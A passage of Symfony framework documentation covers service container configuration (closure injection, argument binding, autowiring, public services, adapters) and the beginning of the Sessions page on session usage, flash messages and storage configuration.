        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\RemovedService;

        return function(ContainerConfigurator $containerConfigurator) {
            $services = $containerConfigurator->services();

            $services->remove(RemovedService::class);
        };

Now, the container will not contain the ``App\RemovedService`` in the ``test``
environment.

.. _container_closure-as-argument:

Injecting a Closure as an Argument
----------------------------------

It is possible to inject a callable as an argument of a service.
Let's add an argument to our ``MessageGenerator`` constructor::

    // src/Service/MessageGenerator.php
    namespace App\Service;

    use Psr\Log\LoggerInterface;

    class MessageGenerator
    {
        private string $messageHash;

        public function __construct(
            private LoggerInterface $logger,
            callable $generateMessageHash,
        ) {
            $this->messageHash = $generateMessageHash();
        }
        // ...
    }

Now, we would add a new invokable service to generate the message hash::

    // src/Hash/MessageHashGenerator.php
    namespace App\Hash;

    class MessageHashGenerator
    {
        public function __invoke(): string
        {
            // Compute and return a message hash
        }
    }

Our configuration looks like this:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ... same code as before

            # explicitly configure the service
            App\Service\MessageGenerator:
                arguments:
                    $logger: '@monolog.logger.request'
                    $generateMessageHash: !closure '@App\Hash\MessageHashGenerator'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... same code as before -->

                <!-- Explicitly configure the service -->
                <service id="App\Service\MessageGenerator">
                    <argument key="$logger" type="service" id="monolog.logger.request"/>
                    <argument key="$generateMessageHash" type="closure" id="App\Hash\MessageHashGenerator"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Service\MessageGenerator;

        return function(ContainerConfigurator $containerConfigurator): void {
            // ... same code as before

            // explicitly configure the service
            $services->set(MessageGenerator::class)
                ->arg('$logger', service('monolog.logger.request'))
                ->arg('$generateMessageHash', closure('App\Hash\MessageHashGenerator'))
            ;
        };

.. seealso::

    Closures can be injected :ref:`by using autowiring <autowiring_closures>`
    and its dedicated attributes.

.. _services-binding:

Binding Arguments by Name or Type
---------------------------------

You can also use the ``bind`` keyword to bind specific arguments by name or type:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            _defaults:
                bind:
                    # pass this value to any $adminEmail argument for any service
                    # that's defined in this file (including controller arguments)
                    $adminEmail: 'manager@example.com'

                    # pass this service to any $requestLogger argument for any
                    # service that's defined in this file
                    $requestLogger: '@monolog.logger.request'

                    # pass this service for any LoggerInterface type-hint for any
                    # service that's defined in this file
                    Psr\Log\LoggerInterface: '@monolog.logger.request'

                    # optionally you can define both the name and type of the argument to match
                    string $adminEmail: 'manager@example.com'
                    Psr\Log\LoggerInterface $requestLogger: '@monolog.logger.request'
                    iterable $rules: !tagged_iterator app.foo.rule

            # ...

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <defaults autowire="true" autoconfigure="true" public="false">
                    <bind key="$adminEmail">manager@example.com</bind>
                    <bind key="$requestLogger"
                        type="service"
                        id="monolog.logger.request"
                    />
                    <bind key="Psr\Log\LoggerInterface"
                        type="service"
                        id="monolog.logger.request"
                    />

                    <!-- optionally you can define both the name and type of the argument to match -->
                    <bind key="string $adminEmail">manager@example.com</bind>
                    <bind key="Psr\Log\LoggerInterface $requestLogger"
                        type="service"
                        id="monolog.logger.request"
                    />
                    <bind key="iterable $rules"
                        type="tagged_iterator"
                        tag="app.foo.rule"
                    />
                </defaults>

                <!-- ... -->
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use Psr\Log\LoggerInterface;

        return function(ContainerConfigurator $container): void {
            $services = $container->services()
                ->defaults()
                    // pass this value to any $adminEmail argument for any service
                    // that's defined in this file (including controller arguments)
                    ->bind('$adminEmail', 'manager@example.com')

                    // pass this service to any $requestLogger argument for any
                    // service that's defined in this file
                    ->bind('$requestLogger', service('monolog.logger.request'))

                    // pass this service for any LoggerInterface type-hint for any
                    // service that's defined in this file
                    ->bind(LoggerInterface::class, service('monolog.logger.request'))

                    // optionally you can define both the name and type of the argument to match
                    ->bind('string $adminEmail', 'manager@example.com')
                    ->bind(LoggerInterface::class.' $requestLogger', service('monolog.logger.request'))
                    ->bind('iterable $rules', tagged_iterator('app.foo.rule'))
            ;

            // ...
        };

By putting the ``bind`` key under ``_defaults``, you can specify the value of *any*
argument for *any* service defined in this file! You can bind arguments by name
(e.g. ``$adminEmail``), by type (e.g. ``Psr\Log\LoggerInterface``) or both
(e.g. ``Psr\Log\LoggerInterface $requestLogger``).

The ``bind`` config can also be applied to specific services or when
:ref:`loading many services at once <service-psr4-loader>`).

Abstract Service Arguments
--------------------------

Sometimes, the values of some service arguments can't be defined in the
configuration files because they are calculated at runtime using a
:doc:`compiler pass </service_container/compiler_passes>`
or :doc:`bundle extension </bundles/extension>`.

In those cases, you can use the ``abstract`` argument type to define at least
the name of the argument and some short description about its purpose:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            App\Service\MyService:
                arguments:
                    $rootNamespace: !abstract 'should be defined by Pass'

            # ...

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Service\MyService" class="App\Service\MyService">
                    <argument key="$rootNamespace" type="abstract">should be defined by Pass</argument>
                </service>

                <!-- ... -->
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Service\MyService;
        use Psr\Log\LoggerInterface;
        use Symfony\Component\DependencyInjection\Definition;
        use Symfony\Component\DependencyInjection\Reference;

        return function(ContainerConfigurator $container) {
            $services = $container->services();

            $services->set(MyService::class)
                ->arg('$rootNamespace', abstract_arg('should be defined by Pass'))
            ;

            // ...
        };

If you don't replace the value of an abstract argument during runtime, a
``RuntimeException`` will be thrown with a message like
``Argument "$rootNamespace" of service "App\Service\MyService" is abstract: should be defined by Pass.``

.. _services-autowire:

The autowire Option
-------------------

Above, the ``services.yaml`` file has ``autowire: true`` in the ``_defaults`` section
so that it applies to all services defined in that file. With this setting, you're
able to type-hint arguments in the ``__construct()`` method of your services and
the container will automatically pass you the correct arguments. This entire entry
has been written around autowiring.

For more details about autowiring, check out :doc:`/service_container/autowiring`.

.. _services-autoconfigure:

The autoconfigure Option
------------------------

Above, the ``services.yaml`` file has ``autoconfigure: true`` in the ``_defaults``
section so that it applies to all services defined in that file. With this setting,
the container will automatically apply certain configuration to your services, based
on your service's *class*. This is mostly used to *auto-tag* your services.

For example, to create a Twig extension, you need to create a class, register it
as a service, and :doc:`tag </service_container/tags>` it with ``twig.extension``.

But, with ``autoconfigure: true``, you don't need the tag. In fact, if you're using
the :ref:`default services.yaml config <service-container-services-load-example>`,
you don't need to do *anything*: the service will be automatically loaded. Then,
``autoconfigure`` will add the ``twig.extension`` tag *for* you, because your class
implements ``Twig\Extension\ExtensionInterface``. And thanks to ``autowire``, you can even add
constructor arguments without any configuration.

Autoconfiguration also works with attributes. Some attributes like
:class:`Symfony\\Component\\Messenger\\Attribute\\AsMessageHandler`,
:class:`Symfony\\Component\\EventDispatcher\\Attribute\\AsEventListener` and
:class:`Symfony\\Component\\Console\\Attribute\\AsCommand` are registered
for autoconfiguration. Any class using these attributes will have tags applied
to them.

Linting Service Definitions
---------------------------

The ``lint:container`` command checks that the arguments injected into services
match their type declarations. It's useful to run it before deploying your
application to production (e.g. in your continuous integration server):

.. code-block:: terminal

    $ php bin/console lint:container

Checking the types of all service arguments whenever the container is compiled
can hurt performance. That's why this type checking is implemented in a
:doc:`compiler pass </service_container/compiler_passes>` called
``CheckTypeDeclarationsPass`` which is disabled by default and enabled only when
executing the ``lint:container`` command. If you don't mind the performance
loss, enable the compiler pass in your application.

.. _container-public:

Public Versus Private Services
------------------------------

Every service defined is private by default. When a service is private, you
cannot access it directly from the container using ``$container->get()``. As a
best practice, you should only create *private* services and you should fetch
services using dependency injection instead of using ``$container->get()``.

If you need to fetch services lazily, instead of using public services you
should consider using a :ref:`service locator <service-locators>`.

But, if you *do* need to make a service public, override the ``public``
setting:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ... same code as before

            # explicitly configure the service
            App\Service\PublicService:
                public: true

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... same code as before -->

                <!-- Explicitly configure the service -->
                <service id="App\Service\PublicService" public="true"></service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Service\PublicService;

        return function(ContainerConfigurator $container): void {
            // ... same as code before

            // explicitly configure the service
            $services->set(Service\PublicService::class)
                ->public()
            ;
        };

.. _service-psr4-loader:

Importing Many Services at once with resource
---------------------------------------------

You've already seen that you can import many services at once by using the ``resource``
key. For example, the default Symfony configuration contains this:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ... same as before

            # makes classes in src/ available to be used as services
            # this creates a service per class whose id is the fully-qualified class name
            App\:
                resource: '../src/'
                exclude: '../src/{DependencyInjection,Entity,Kernel.php}'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... same as before -->

                <prototype namespace="App\" resource="../src/" exclude="../src/{DependencyInjection,Entity,Kernel.php}"/>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        return function(ContainerConfigurator $container): void {
            // ...

            // makes classes in src/ available to be used as services
            // this creates a service per class whose id is the fully-qualified class name
            $services->load('App\\', '../src/')
                ->exclude('../src/{DependencyInjection,Entity,Kernel.php}');
        };

.. tip::

    The value of the ``resource`` and ``exclude`` options can be any valid
    `glob pattern`_. If you want to exclude only a few services, you
    may use the :class:`Symfony\\Component\\DependencyInjection\\Attribute\\Exclude`
    attribute directly on your class to exclude it.

This can be used to quickly make many classes available as services and apply some
default configuration. The ``id`` of each service is its fully-qualified class name.
You can override any service that's imported by using its id (class name) below
(e.g. see :ref:`how to manually wire arguments <services-manually-wire-args>`).
If you override a service, none of the options (e.g. ``public``) are inherited
from the import (but the overridden service *does* still inherit from ``_defaults``).

You can also ``exclude`` certain paths. This is optional, but will slightly increase
performance in the ``dev`` environment: excluded paths are not tracked and so modifying
them will not cause the container to be rebuilt.

.. note::

    Wait, does this mean that *every* class in ``src/`` is registered as
    a service? Even model classes? Actually, no. As long as you keep your imported services as :ref:`private <container-public>`, all
    classes in ``src/`` that are *not* explicitly used as services are
    automatically removed from the final container. In reality, the import
    means that all classes are "available to be *used* as services" without needing
    to be manually configured.

Multiple Service Definitions Using the Same Namespace
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you define services using the YAML config format, the PHP namespace is used
as the key of each configuration, so you can't define different service configs
for classes under the same namespace:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Domain\:
                resource: '../src/Domain/*'
                # ...

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <prototype namespace="App\Domain"
                    resource="../src/App/Domain/*"/>

                <!-- ... -->
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        use Symfony\Component\DependencyInjection\Definition;

        $defaults = new Definition();

        // $this is a reference to the current loader
        $this->registerClasses(
            $defaults,
            'App\\Domain\\',
            '../src/App/Domain/*'
        );

        // ...

In order to have multiple definitions, add the ``namespace`` option and use any
unique string as the key of each service config:

.. code-block:: yaml

    # config/services.yaml
    services:
        command_handlers:
            namespace: App\Domain\
            resource: '../src/Domain/*/CommandHandler'
            tags: [command_handler]

        event_subscribers:
            namespace: App\Domain\
            resource: '../src/Domain/*/EventSubscriber'
            tags: [event_subscriber]

.. _services-explicitly-configure-wire-services:

Explicitly Configuring Services and Arguments
---------------------------------------------

:ref:`Loading services automatically <service-container-services-load-example>`
and :ref:`autowiring <services-autowire>` are optional. And even if you use them, there may be some
cases where you want to manually wire a service. For example, suppose that you want
to register *2* services for the ``SiteUpdateManager`` class - each with a different
admin email. In this case, each needs to have a unique service id:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            # this is the service's id
            site_update_manager.superadmin:
                class: App\Service\SiteUpdateManager
                # you CAN still use autowiring: we just want to show what it looks like without
                autowire: false
                # manually wire all arguments
                arguments:
                    - '@App\Service\MessageGenerator'
                    - '@mailer'
                    - 'superadmin@example.com'

            site_update_manager.normal_users:
                class: App\Service\SiteUpdateManager
                autowire: false
                arguments:
                    - '@App\Service\MessageGenerator'
                    - '@mailer'
                    - 'contact@example.com'

            # Create an alias, so that - by default - if you type-hint SiteUpdateManager,
            # the site_update_manager.superadmin will be used
            App\Service\SiteUpdateManager: '@site_update_manager.superadmin'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->

                <service id="site_update_manager.superadmin" class="App\Service\SiteUpdateManager" autowire="false">
                    <argument type="service" id="App\Service\MessageGenerator"/>
                    <argument type="service" id="mailer"/>
                    <argument>superadmin@example.com</argument>
                </service>

                <service id="site_update_manager.normal_users" class="App\Service\SiteUpdateManager" autowire="false">
                    <argument type="service" id="App\Service\MessageGenerator"/>
                    <argument type="service" id="mailer"/>
                    <argument>contact@example.com</argument>
                </service>

                <service id="App\Service\SiteUpdateManager" alias="site_update_manager.superadmin"/>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Service\MessageGenerator;
        use App\Service\SiteUpdateManager;

        return function(ContainerConfigurator $container): void {
            // ...

            // site_update_manager.superadmin is the service's id
            $services->set('site_update_manager.superadmin', SiteUpdateManager::class)
                // you CAN still use autowiring: we just want to show what it looks like without
                ->autowire(false)
                // manually wire all arguments
                ->args([
                   service(MessageGenerator::class),
                   service('mailer'),
                   'superadmin@example.com',
                ]);

            $services->set('site_update_manager.normal_users', SiteUpdateManager::class)
                ->autowire(false)
                ->args([
                    service(MessageGenerator::class),
                    service('mailer'),
                    'contact@example.com',
                ]);

            // Create an alias, so that - by default - if you type-hint SiteUpdateManager,
            // the site_update_manager.superadmin will be used
            $services->alias(SiteUpdateManager::class, 'site_update_manager.superadmin');
        };

In this case, *two* services are registered: ``site_update_manager.superadmin``
and ``site_update_manager.normal_users``. Thanks to the alias, if you type-hint
``SiteUpdateManager`` the first (``site_update_manager.superadmin``) will be passed.

If you want to pass the second, you'll need to :ref:`manually wire the service <services-wire-specific-service>`
or to create a named :ref:`autowiring alias <autowiring-alias>`.

.. caution::

    If you do *not* create the alias and are :ref:`loading all services from src/ <service-container-services-load-example>`,
    then *three* services have been created (the automatic service + your two services)
    and the automatically loaded service will be passed - by default - when you type-hint
    ``SiteUpdateManager``. That's why creating the alias is a good idea.

When using PHP closures to configure your services, it is possible to automatically
inject the current environment value by adding a string argument named ``$env`` to
the closure::

    // config/packages/my_config.php
    namespace Symfony\Component\DependencyInjection\Loader\Configurator;

    return function(ContainerConfigurator $containerConfigurator, string $env): void {
        // `$env` is automatically filled in, so you can configure your
        // services depending on which environment you're on
    };

Generating Adapters for Functional Interfaces
---------------------------------------------

Functional interfaces are interfaces with a single method.
They are conceptually very similar to a closure except that their only method
has a name. Moreover, they can be used as type-hints across your code.

The :class:`Symfony\\Component\\DependencyInjection\\Attribute\\AutowireCallable`
attribute can be used to generate an adapter for a functional interface.
Let's say you have the following functional interface::

    // src/Service/MessageFormatterInterface.php
    namespace App\Service;

    interface MessageFormatterInterface
    {
        public function format(string $message, array $parameters): string;
    }

You also have a service that defines many methods and one of them is the same
``format()`` method of the previous interface::

    // src/Service/MessageFormatterInterface.php
    namespace App\Service;

    class MessageUtils
    {
        // other methods...

        public function format(string $message, array $parameters): string
        {
            // ...
        }
    }

Thanks to the ``#[AutowireCallable]`` attribute, you can now inject this
``MessageUtils`` service as a functional interface implementation::

    namespace App\Service\Mail;

    use App\Service\MessageFormatterInterface;
    use App\Service\MessageUtils;
    use Symfony\Component\DependencyInjection\Attribute\AutowireCallable;

    class Mailer
    {
        public function __construct(
            #[AutowireCallable(service: MessageUtils::class, method: 'format')]
            private MessageFormatterInterface $formatter
        ) {
        }

        public function sendMail(string $message, array $parameters): string
        {
            $formattedMessage = $this->formatter->format($message, $parameters);

            // ...
        }
    }

Instead of using the ``#[AutowireCallable]`` attribute, you can also generate
an adapter for a functional interface through configuration:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:

            # ...

            app.message_formatter:
                class: App\Service\MessageFormatterInterface
                from_callable: [!service {class: 'App\Service\MessageUtils'}, 'format']

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->

                <service id="app.message_formatter" class="App\Service\MessageFormatterInterface">
                    <from-callable method="format">
                        <service class="App\Service\MessageUtils"/>
                    </from-callable>
                </service>

            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Service\MessageFormatterInterface;
        use App\Service\MessageUtils;

        return function(ContainerConfigurator $container) {
            // ...

            $container
                ->set('app.message_formatter', MessageFormatterInterface::class)
                ->fromCallable([inline_service(MessageUtils::class), 'format'])
                ->alias(MessageFormatterInterface::class, 'app.message_formatter')
            ;
        };

By doing so, Symfony will generate a class (also called an *adapter*)
implementing ``MessageFormatterInterface`` that will forward calls of
``MessageFormatterInterface::format()`` to your underlying service's method
``MessageUtils::format()``, with all its arguments.

Learn more
----------

.. toctree::
    :maxdepth: 1
    :glob:

    /service_container/*

.. _`glob pattern`: https://en.wikipedia.org/wiki/Glob_(programming)
.. _`Symfony Fundamentals screencast series`: https://symfonycasts.com/screencast/symfony-fundamentals
Sessions
========

The Symfony HttpFoundation component has a very powerful and flexible session
subsystem which is designed to provide session management that you can use to
store information about the user between requests through a clear
object-oriented interface using a variety of session storage drivers.

Symfony sessions are designed to replace the usage of the ``$_SESSION`` super
global and native PHP functions related to manipulating the session like
``session_start()``, ``session_regenerate_id()``, ``session_id()``,
``session_name()``, and ``session_destroy()``.

.. note::

    Sessions are only started if you read or write from it.

Installation
------------

You need to install the HttpFoundation component to handle sessions:

.. code-block:: terminal

    $ composer require symfony/http-foundation

.. _session-intro:

Basic Usage
-----------

The session is available through the ``Request`` object and the ``RequestStack``
service. Symfony injects the ``request_stack`` service in services and controllers
if you type-hint an argument with :class:`Symfony\\Component\\HttpFoundation\\RequestStack`::

.. configuration-block::

    .. code-block:: php-symfony

        use Symfony\Component\HttpFoundation\RequestStack;

        class SomeService
        {
            public function __construct(
                private RequestStack $requestStack,
            ) {
                // Accessing the session in the constructor is *NOT* recommended, since
                // it might not be accessible yet or lead to unwanted side-effects
                // $this->session = $requestStack->getSession();
            }

            public function someMethod(): void
            {
                $session = $this->requestStack->getSession();

                // ...
            }
        }

    .. code-block:: php-standalone

        use Symfony\Component\HttpFoundation\Session\Session;

        $session = new Session();
        $session->start();

From a Symfony controller, you can also type-hint an argument with
:class:`Symfony\\Component\\HttpFoundation\\Request`::

    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;

    public function index(Request $request): Response
    {
        $session = $request->getSession();

        // ...
    }

Session Attributes
------------------

PHP's session management requires the use of the ``$_SESSION`` super-global.
However, this interferes with code testability and encapsulation in an OOP
paradigm. To help overcome this, Symfony uses *session bags* linked to the
session to encapsulate a specific dataset of **attributes**.

This approach mitigates namespace pollution within the ``$_SESSION``
super-global because each bag stores all its data under a unique namespace.
This allows Symfony to peacefully co-exist with other applications or libraries
that might use the ``$_SESSION`` super-global and all data remains completely
compatible with Symfony's session management.

A session bag is a PHP object that acts like an array::

    // stores an attribute for reuse during a later user request
    $session->set('attribute-name', 'attribute-value');

    // gets an attribute by name
    $foo = $session->get('foo');

    // the second argument is the value returned when the attribute doesn't exist
    $filters = $session->get('filters', []);

Stored attributes remain in the session for the remainder of that user's session.
By default, session attributes are key-value pairs managed with the
:class:`Symfony\\Component\\HttpFoundation\\Session\\Attribute\\AttributeBag`
class.

.. tip::

    Sessions are automatically started whenever you read, write or even check
    for the existence of data in the session. This may hurt your application
    performance because all users will receive a session cookie. In order to
    prevent starting sessions for anonymous users, you must *completely* avoid
    accessing the session.

.. _flash-messages:

Flash Messages
--------------

You can store special messages, called "flash" messages, on the user's session.
By design, flash messages are meant to be used exactly once: they vanish from
the session automatically as soon as you retrieve them. This feature makes
"flash" messages particularly great for storing user notifications.

For example, imagine you're processing a :doc:`form </forms>` submission::

.. configuration-block::

    .. code-block:: php-symfony

        use Symfony\Component\HttpFoundation\Request;
        use Symfony\Component\HttpFoundation\Response;
        // ...

        public function update(Request $request): Response
        {
            // ...

            if ($form->isSubmitted() && $form->isValid()) {
                // do some sort of processing

                $this->addFlash(
                    'notice',
                    'Your changes were saved!'
                );
                // $this->addFlash() is equivalent to $request->getSession()->getFlashBag()->add()

                return $this->redirectToRoute(/* ... */);
            }

            return $this->render(/* ... */);
        }

    .. code-block:: php-standalone

        use Symfony\Component\HttpFoundation\Session\Session;

        $session = new Session();
        $session->start();

        // retrieve the flash messages bag
        $flashes = $session->getFlashBag();

        // add flash messages
        $flashes->add(
            'warning',
            'Your config file is writable, it should be set read-only'
        );
        $flashes->add('error', 'Failed to update name');
        $flashes->add('error', 'Another error');

After processing the request, the controller sets a flash message in the session
and then redirects. The message key (``warning`` and ``error`` in this example) can be anything:
you'll use this key to retrieve the message.

In the template of the next page (or even better, in your base layout template),
read any flash messages from the session using the ``flashes()`` method provided
by the :ref:`Twig global app variable <twig-app-variable>`:

.. configuration-block::

    .. code-block:: html+twig

        {# templates/base.html.twig #}

        {# read and display just one flash message type #}
        {% for message in app.flashes('notice') %}
            <div class="flash-notice">
                {{ message }}
            </div>
        {% endfor %}

        {# read and display several types of flash messages #}
        {% for label, messages in app.flashes(['success', 'warning']) %}
            {% for message in messages %}
                <div class="flash-{{ label }}">
                    {{ message }}
                </div>
            {% endfor %}
        {% endfor %}

        {# read and display all flash messages #}
        {% for label, messages in app.flashes %}
            {% for message in messages %}
                <div class="flash-{{ label }}">
                    {{ message }}
                </div>
            {% endfor %}
        {% endfor %}

    .. code-block:: php-standalone

        // display warnings
        foreach ($session->getFlashBag()->get('warning', []) as $message) {
            echo '<div class="flash-warning">'.$message.'</div>';
        }

        // display errors
        foreach ($session->getFlashBag()->get('error', []) as $message) {
            echo '<div class="flash-error">'.$message.'</div>';
        }

        // display all flashes at once
        foreach ($session->getFlashBag()->all() as $type => $messages) {
            foreach ($messages as $message) {
                echo '<div class="flash-'.$type.'">'.$message.'</div>';
            }
        }

It's common to use ``notice``, ``warning`` and ``error`` as the keys of the
different types of flash messages, but you can use any key that fits your
needs.

.. tip::

    You can use the
    :method:`Symfony\\Component\\HttpFoundation\\Session\\Flash\\FlashBagInterface::peek`
    method instead to retrieve the message while keeping it in the bag.

Configuration
-------------

In the Symfony framework, sessions are enabled by default. Session storage and
other configuration can be controlled under the :ref:`framework.session
configuration <config-framework-session>` in
``config/packages/framework.yaml``:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            # Enables session support. Note that the session will ONLY be started if you read or write from it.
            # Remove or comment this section to explicitly disable session support.
            session:
                # ID of the service used for session storage
                # NULL means that Symfony uses PHP default session mechanism
                handler_id: null
                # improves the security of the cookies used for sessions
                cookie_secure: auto
                cookie_samesite: lax
                storage_factory_id: session.storage.factory.native

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <!--
                    Enables session support. Note that the session will ONLY be started if you read or write from it.
                    Remove or comment this section to explicitly disable session support.
                    handler-id: ID of the service used for session storage
                                NULL means that Symfony uses PHP default session mechanism
                    cookie-secure and cookie-samesite: improves the security of the cookies used for sessions
                -->
                <framework:session handler-id="null"
                                   cookie-secure="auto"
                                   cookie-samesite="lax"
                                   storage_factory_id="session.storage.factory.native"/>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Component\HttpFoundation\Cookie;
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->session()
                // Enables session support. Note that the session will ONLY be started if you read or write from it.
                // Remove or comment this section to explicitly disable session support.
                ->enabled(true)
                // ID of the service used for session storage
                // NULL means that Symfony uses PHP default session mechanism
                ->handlerId(null)
                // improves the security of the cookies used for sessions
                ->cookieSecure('auto')
                ->cookieSamesite(Cookie::SAMESITE_LAX)
                ->storageFactoryId('session.storage.factory.native')
            ;
        };

    .. code-block:: php-standalone

        use Symfony\Component\HttpFoundation\Cookie;
        use Symfony\Component\HttpFoundation\Session\Attribute\AttributeBag;
        use Symfony\Component\HttpFoundation\Session\Session;
        use Symfony\Component\HttpFoundation\Session\Storage\NativeSessionStorage;

        $storage = new NativeSessionStorage([
            'cookie_secure' => 'auto',
            'cookie_samesite' => Cookie::SAMESITE_LAX,
        ]);
        $session = new Session($storage);

Setting the ``handler_id`` config option to ``null`` means that Symfony will
use the native PHP session mechanism. The session metadata files will be stored
outside of the Symfony application, in a directory controlled by PHP. Although
this usually simplifies things, some session expiration related options may not
work as expected if other applications that write to the same directory have
short max lifetime settings.

If you prefer, you can use the ``session.handler.native_file`` service as
``handler_id`` to let Symfony manage the sessions itself. Another useful option
is ``save_path``, which defines the directory where Symfony will store the
session metadata files:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            session:
                # ...
                handler_id: 'session.handler.native_file'
                save_path: '%kernel.project_dir%/var/sessions/%kernel.environment%'

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:session enabled="true"
                                   handler-id="session.handler.native_file"
                                   save-path="%kernel.project_dir%/var/sessions/%kernel.environment%"/>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->session()
                // ...
                ->handlerId('session.handler.native_file')
                ->savePath('%kernel.project_dir%/var/sessions/%kernel.environment%')
            ;
        };

    .. code-block:: php-standalone

        use Symfony\Component\HttpFoundation\Cookie;
        use Symfony\Component\HttpFoundation\Session\Attribute\AttributeBag;
        use Symfony\Component\HttpFoundation\Session\Session;
        use Symfony\Component\HttpFoundation\Session\Storage\Handler\NativeFileSessionHandler;
        use Symfony\Component\HttpFoundation\Session\Storage\NativeSessionStorage;

        $handler = new NativeFileSessionHandler('/var/sessions');
        $storage = new NativeSessionStorage([], $handler);
        $session = new Session($storage);

Check out the Symfony config reference to learn more about the other available
:ref:`Session configuration options <config-framework-session>`.

.. caution::

    Symfony sessions are incompatible with ``php.ini`` directive
    ``session.auto_start = 1`` This directive should be turned off in
    ``php.ini``, in the web server directives or in ``.htaccess``.

The session cookie is also available in :ref:`the Response object <component-http-foundation-response>`.
This is useful to get that cookie in the CLI context or when using PHP runners
like Roadrunner or Swoole.

